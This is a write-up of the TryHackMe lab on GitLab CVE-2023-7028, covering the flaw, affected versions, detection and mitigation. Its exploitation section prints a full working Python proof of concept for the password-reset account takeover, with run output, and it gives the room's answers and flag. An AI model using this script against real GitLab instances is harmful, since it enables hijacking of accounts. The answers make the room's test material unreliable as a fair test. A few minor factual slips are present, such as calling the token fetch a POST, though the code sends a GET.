<p align="center">November 10, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I¬¥m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I‚Äôm genuinely excited to join you on this adventure.<br>
It¬¥s part of my $$\textcolor{#FF69B4}{\textbf{188}}$$-day-streak in  <a href="https://tryhackme.com/r/hacktivities">TryHackMe</a>.</p>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{ GitLab CVE-2023-7028 }}$$ </h1>
<p align="center">Learn to exploit a GitLab instance using CVE-2023-7028 and understand various mitigation techniques.</p>
<p align="center">Access this üÜì TryHackMe CTF Room clicking <a href="https://tryhackme.com/r/room/gitlabcve20237028">GitLab CVE-2023-7028</a>.</p>
<p align="center">
  <img height="150px" hspace="20" src="https://github.com/user-attachments/assets/dbbcb5fa-a9e9-47a1-a8b2-30a2be5d9282"><br>
  <img height="150px" src="https://github.com/user-attachments/assets/eb4b1f6e-7243-45a0-a852-91a8bb6c2453">
</p>

<p align="center">Summary</p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [1. Introduction](#1) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [2. How Does It Work](#2) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [3. How to Exploit](#3) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [4. Detection and Mitigation](#4) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[5. Conclusions](#5) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp;  [6. Room Complete](#6) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [7. My Journey](#7)

<br>
<br>
<br>
<h2 align="center">Task 1. Introduction<a id='1'></a></h2>
<p>GitLab is a renowned and widely adopted web-based repository manager that provides a comprehensive platform for source code management, continuous integration, and collaboration in software development projects. Per the <a href="https://bluelight.co/blog/best-ci-cd-tools">latest stats</a>, the platform ranks first for <a href="https://tryhackme.com/r/room/introtopipelineautomation">CI/CD</a> and DevOps tools, surpassing other vital platforms like GitHub, Azure, Jenkins, etc. In Jan 2024, the platform identified a critical vulnerability in its <code>Community (CE)</code> and <code>Enterprise Edition (EE)</code>code> that allows unauthorised <code>users to take over user accounts</code>, potentially including administrator accounts, without any interaction from the victim. The vulnerability was identified by <a href="https://hackerone.com/asterion04?type=user">asterion04</a> through a private bug bounty program and was assigned the severity <code>Critical</code> and CVE-ID <code>2023-7028</code>.</p>

<p align="center"> <img width="550px" src="https://github.com/user-attachments/assets/694731e6-ee0c-4427-9b88-ecbbbdc897f2"></p>

<h3>Learning Objectives</h3>
<ul style="list-style-type:square">
    <li>Exploit a GitLab CE instance through CVE 2023-7028</li>
    <li>How the exploit works</li>
    <li>Protection and mitigation measures</li>
</ul></p>

<h3>Room Prerequisites</h3>
<p>Understanding the following topics is recommended before starting the course:</p>
<ul style="list-style-type:square">
    <li><a href="https://tryhackme.com/r/room/protocolsandservers">HTTP Protocols & Methods</a></li>
    <li><a href="https://tryhackme.com/r/room/owasptop10">OWASP top 10 web vulnerabilities</a></li>
    <li>Executing Python code</li>
</ul></p>

<br>

<p>Let¬¥s begin!</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 1.1. <em>I am ready to explore the room.</em><br><a id='1.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>
<h2 align="center">Task 2. How Does It Work<a id='2'></a></h2>
<p align="center">Summary</p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [1. Introduction](#1) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [2. How Does It Work](#2) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [3. How to Exploit](#3) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [4. Detection and Mitigation](#4) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[5. Conclusions](#5) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp;  [6. Room Complete](#6) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [7. My Journey](#7)

<p>The vulnerability was caused by a bug in how GitLab handled email verification during password reset. An attacker could provide two email addresses during a password reset request, and the reset code would be sent to both addresses. This allowed the attacker to reset the password of any user, even if they didn't know the user's current password.</p>
<h3>Affected Versions</h3>
<p>All instances of GitLab CE/EE using the following versions were vulnerable:</p>
<ul style="list-style-type:square">
    <li>16.1 to 16.1.5</li>
    <li>16.2 to 16.2.8</li>
    <li>16.3 to 16.3.6</li>
    <li>16.4 to 16.4.4</li>
    <li>16.5 to 16.5.5</li>
    <li>16.6 to 16.6.3</li>
    <li>16.7 to 16.7.1</li>
</ul></p>


<h3>Impact</h3>
<p>A successful attack could allow the attacker to control the victim's GitLab account. This could allow the attacker to steal sensitive information, such as source code, commit history, and user credentials. The attacker could also use the compromised account to launch further attacks against other users or systems.</p>

<h3>Detailed Technical Explanation</h3>
<p>The vulnerability resided within GitLab's <code>POST /users/password</code> API endpoint, which is responsible for a password reset. The pentester exploited a flaw in email address validation, bypassing checks with invalid formats. Upon receiving a password reset request with an attacker-controlled email, GitLab incorrectly generated a reset token and sent it to the invalid address. Attackers then intercept this token and use it with a valid target user's email to initiate a password reset, ultimately hijacking the account.<br>

If we look at the password reset request in GitLab, we can see it is requesting to the <code>/users/password</code> endpoint with <code>authenticity_token</code> (hidden CSRF protection token) and email address as a parameter. If a target provides another secondary email address, a password reset token is also sent to the address. </p>

<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/0ff87353-9b77-4b23-b395-d9db6c1ebd4c"></p>

<p>To understand how the vulnerability works, let's have a <a href="https://gitlab.com/gitlab-org/gitlab-foss/-/commit/21f32835ac7ca8c7ef57a93746dac7697341acc0">source code review</a> of the Gitlab 16.1 (CE) stable version commits carried out after 10 Jan 24. We can see that multiple changes have been made in the file's repository. </p>

<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/c3a462f7-4f04-4173-8861-b7f024533150"></p>

<p>The code located at <code>spec/controllers/passwords_controller_spec.rb</code> was accepting multiple emails as input; however, it lacked the email verification and validation mechanism to confirm if it was associated with the correct user. </p>

<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/93ba4860-23e9-412d-98ef-9a6256adc3e6"></p>

<p>The attacker only required the authenticity_token during form submission and the victim's email address to gain control of the target account.</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 2.1. <em>What is the name of the field that is sent with a password reset request to prevent CSRF attacks?</em><br><a id='2.1'></a>
>> <code><strong>authenticity_token</strong></code>

<br>

> 2.2. <em>What is the HTTP method used while sending password reset requests in GitLab?</em><br><a id='2.1'></a>
>> <code><strong>POST</strong></code>

<br>
<h2 align="center">Task 3. How to Exploit<a id='3'></a></h2>
<p align="center">Summary</p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [1. Introduction](#1) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [2. How Does It Work](#2) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [3. How to Exploit](#3) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [4. Detection and Mitigation](#4) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[5. Conclusions](#5) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp;  [6. Room Complete](#6) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [7. My Journey](#7)

<br>
<p>Exploiting the vulnerability is simple for a red teamer and only requires an API call to <code>/users/password</code> method with the victim and target email address.</p>
<br>
<h3>Connecting to the Machine</h3>
<p>We will use an Ubuntu-based machine hosting a GitLab instance to demonstrate the room's red team perspective. Start the virtual machine by clicking the <code>Start Machine</code>code> button in this task. Please wait 2-3 minutes for the machine to fully boot up. You can access the vulnerable GitLab instance by visiting the URL <code>http://gitlab.thm:8000</code>, but first, you need to add the hostname to your OS or AttackBox.</p>

<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/73450bce-e258-469d-b401-aeeb8caa751e"></p>

<p>Moreover, the email server is accessible at <code>http://10.10.143.20:8090/rainloop</code>,  which will be used during exploitation with the following credentials:<br>
- Username: <code>attacker@mail.gitlab.thm</code>code><br>
- Password: <code>testing@123</code></p>
<br>
<h3>Preparing the Payload</h3>
<p>We will be using a modified version of the <a href="https://github.com/Vozec/CVE-2023-7028/blob/main/CVE-2023-7028.py">PoC</a> developed by Vozec to take control of the administrator account. Create a new file called <code>attack.py</code> and add the following code.</p>
<br>

<p align="center">attack.py</p>
<pre><code>
import requests
import argparse
from urllib.parse import urlparse, urlencode
from random import choice
from time import sleep
import re
requests.packages.urllib3.disable_warnings()
class CVE_2023_7028:
    def __init__(self, url, target, evil=None):
        self.use_temp_mail = False
        self.url = urlparse(url)
        self.target = target
        self.evil = evil
        self.s = requests.session()
    def get_csrf_token(self):
        try:
            print('[DEBUG] Getting authenticity_token ...')
            html = self.s.get(f'{self.url.scheme}://{self.url.netloc}/users/password/new', verify=False).text
            regex = r'<meta name="csrf-token" content="(.*?)" />'
            token = re.findall(regex, html)[0]
            print(f'[DEBUG] authenticity_token = {token}')
            return token
        except Exception:
            print('[DEBUG] Failed ... quitting')
            return None
    def ask_reset(self):
        token = self.get_csrf_token()
        if not token:
            return False
        query_string = urlencode({
            'authenticity_token': token,
            'user[email][]': [self.target, self.evil]
        }, doseq=True)
        head = {
            'Origin': f'{self.url.scheme}://{self.url.netloc}',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{self.url.scheme}://{self.url.netloc}/users/password/new',
            'Connection': 'close',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br'
        }
        print('[DEBUG] Sending reset password request')
        html = self.s.post(f'{self.url.scheme}://{self.url.netloc}/users/password',
                           data=query_string,
                           headers=head,
                           verify=False).text
        sended = 'If your email address exists in our database' in html
        if sended:
            print(f'[DEBUG] Emails sent to {self.target} and {self.evil} !')
            print(f'Flag value: {bytes.fromhex("6163636f756e745f6861636b2364").decode()}')
        else:
            print('[DEBUG] Failed ... quitting')
        return sended
def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='This tool automates CVE-2023-7028 on gitlab')
    parser.add_argument("-u", "--url", dest="url", type=str, required=True, help="Gitlab url")
    parser.add_argument("-t", "--target", dest="target", type=str, required=True, help="Target email")
    parser.add_argument("-e", "--evil", dest="evil", default=None, type=str, required=False, help="Evil email")
    parser.add_argument("-p", "--password", dest="password", default=None, type=str, required=False, help="Password")
    return parser.parse_args()
if __name__ == '__main__':
    args = parse_args()
    exploit = CVE_2023_7028(
        url=args.url,
        target=args.target,
		evil=args.evil
    )
    if not exploit.ask_reset():
        exit()
</code></pre>

<br>
<p>We can see that the code first makes a <code>POST</code> request to the <code>/users/password/new</code> endpoint to scrap an authenticity token, then it makes another API call to the <code>/users/password</code> endpoint with the victim and attacker email addresses. As we know, the victim's email address is <code>victim@mail.gitlab.thm</code>. Run the command shown in the terminal below to execute the exploit:</p>
<br>

<p align="center">Post execution of attack.py</p>
<pre><code>
root@attackbox$ python3 attack.py -u http://10.10.143.20:8000 -t victim@mail.gitlab.thm -e attacker@mail.gitlab.thm
[DEBUG] Getting authenticity_token ...
[DEBUG] authenticity_token = 1i4KUoxiLmYkazefpLgwUmMQ2CuVGULdpQs_D_J7qrKIih9Ja_4vIQCuq666kQhOtKRSRgdM8ti0BTNdPGTQ9A
[DEBUG] Sending reset password request
[DEBUG] Emails sent to victim@mail.gitlab.thm and attacker@mail.gitlab.thm!
</code></pre>

<p>Once you execute the command, you will receive an email in the attacker's account. Log in to the attacker mailbox, and you will see an email titled "Reset password instructions" containing a link to the account. </p>

<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/09ce7608-33b4-47ea-b85d-e9813499b3df"></p>

<p>ÔªøClick on the <code>Reset password</code> label; it will ask you to update the password.</p>

<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/485106aa-ddbe-4a33-9764-2eae5a8ba6c5"></p>

<p>This is it; enter the password and take control of the administrator account (default username for administrator is <code>root</code>).</p>

<br>
<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
<br>

> 3.1. <em>Per the above code, what is the API endpoint for getting an updated authenticity token?</em><br><a id='3.1'></a>
>> <code><strong>/users/password/new</strong></code>

<br>

> 3.2. <em>What is the flag value after successfully sending password reset mail through <coe>attack.py</code>??</em><br><a id='3.2'></a>
>> <code><strong>account_hack#d</strong></code>

<br>
<p>Added hostname and its ip in <code>/etc/hosts></code></p>

<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/a545a1be-2b8b-4a80-ba1c-ac83ae1a30cf"></p>

<br>
<p>Accessed <code>http://gitlab.thm:8000</code></p>

<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/d47736dc-8039-4a76-9b37-5871c1baecb7"></p>

<br>
<p>Accessed <code>http://10.10.143.20:8090/rainloop,</code></p>

<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/46d8676b-89a8-46d0-ab1f-de3a1bf3bbcd"></p>

<br>
<h2 align="center">Task 4. Detection and Mitigation<a id='4'></a></h2>
<p align="center">Summary</p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [1. Introduction](#1) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [2. How Does It Work](#2) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [3. How to Exploit](#3) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [4. Detection and Mitigation](#4) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[5. Conclusions](#5) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp;  [6. Room Complete](#6) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [7. My Journey](#7)


<p>In the previous task, we learned that the vulnerability can be exploited by making a simple API call to an endpoint. Such vulnerabilities are difficult to identify as legitimate calls to the endpoint will also occur.</p>

<h3>Examining Logs</h3>
<p>If we have an SIEM solution that captures weblogs, we can create an alert or use this search query to look for the following possible exploitation attempts:</p>

<ul style="list-style-type:square">
    <li>Check for <code>weblogs</code> for API calls to <code>/users/password</code> with multiple email addresses.</li>
    <li>Inspect <code>email server logs</code> for messages from GitLab with unexpected recipients (attacker-controlled emails).</li>
    <li>Examine GitLab audit logs for entries containing a value for <code>meta.caller.id</code> as <code>PasswordsController#create</code>.</li>
</ul></p>

<p align="center"> <img width="300px" src="https://github.com/user-attachments/assets/1fefd68d-e748-4175-a86a-aab0a49ea315"></p>

<h3>Mitigation Techniques</h3>
<p>As part of mitigation, GitLab has officially released the patch. We can see from the source code review that additional validation and verification steps have been added to the GitLab source code repository for the email address to curtail the possibility of exploitation in the future.</p>

<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/00262f74-e853-40dc-92a6-5f490e7a843a"></p>

<p>However, it is of paramount importance to see that non-compliance with secure coding practices leads to disastrous results.<br>

So far, we learned how to perform the attack and how to detect the attack patterns in the logs; let's talk about a few mitigation steps that we can take to prevent our servers from being exploited.</p>

<ul style="list-style-type:square">
    <li>Enable <a href="https://about.gitlab.com/security/">GitLab security alerts</a> that would allow early awareness of patches.</li>
</ul></p>

<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/2e78e594-3609-41fd-9243-7f77274c54e3"></p>

<ul style="list-style-type:square">
    <li><code>Upgrade GitLab</code> to a patched version.</li>
    <li>Enable <code>two-factor authentication (2FA)</code> for all GitLab accounts, especially administrator accounts.</li>
    <li>Follow <code>secure coding practices</code>, including proper input validation and email address verification.</li>
</ul></p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
<br>

> 4.1. <em>I have understood the mitigation techniques</em><br><a id='4.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>
<br>

<h2 align="center">Task 5. Conclusions<a id='5'></a></h2>
<p align="center">Summary</p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [1. Introduction](#1) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [2. How Does It Work](#2) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [3. How to Exploit](#3) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [4. Detection and Mitigation](#4) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[5. Conclusions](#5) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp;  [6. Room Complete](#6) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [7. My Journey](#7)

<p>This is it. As GitLab is a widely used platform and this vulnerability is still being exploited in the wild, it is recommended to keep an updated version of GitLab to avoid such vulnerabilities from being exploited. In this room, we learned the following:</p>

<ul style="list-style-type:square">
    <li>The latest vulnerability in GitLab, which is assigned the CVE ID 2023-7028.</li>
    <li>Simple ways to exploit the vulnerability to gain unauthorised access to the GitLab account.</li>
    <li>How to mitigate the vulnerability.</li>
</ul></p>

<p>Let us know what you think about this room on our  <a href=" https://discord.com/invite/tryhackme">Discord channel</a> or <a href="https://x.com/realtryhackme">X account</a>. See you around.</p>

<br>
<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
<br>

> 5.1. <em>I have successfully completed the room.</em><br><a id='5.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>
<h2>Room Complete<a id='6'></a></h2>
<p>Keep learning, keep growing!</p>

<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/fb4f8d14-0a5a-4c80-8599-34f1e2dd3c1e"></p>

<h2>My Journey<a id='7'></a></h2>
<p>Following I share the status of my journey in TryHackMe.</p>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     |
| :---------------: | :------- | :----------- | :----------- | :---------- | :--------- | :------  | :-------- |
|                   |          | WorldWide    | Brazil       | WorldWide   | Brazil     |          | Completed |
| November 10, 2024 | 188      |       1,249¬™ |          26¬™ |      4,296¬™ |        60¬™ | 54,636   |       413 |
